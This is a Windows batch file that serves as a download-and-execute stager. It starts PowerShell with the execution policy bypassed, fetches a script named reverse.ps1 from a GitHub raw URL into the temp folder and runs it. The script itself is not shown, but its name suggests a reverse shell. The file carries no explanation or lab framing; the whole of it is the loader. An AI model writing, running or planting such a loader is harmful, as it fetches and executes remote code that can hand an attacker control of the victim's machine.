@echo off
powershell.exe -NoProfile -ExecutionPolicy Bypass -Command ^
"Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Tumelo0321/code25/main/reverse.ps1' -OutFile %TEMP%\reverse.ps1 && ^
powershell.exe -NoProfile -ExecutionPolicy Bypass -File %TEMP%\reverse.ps1"
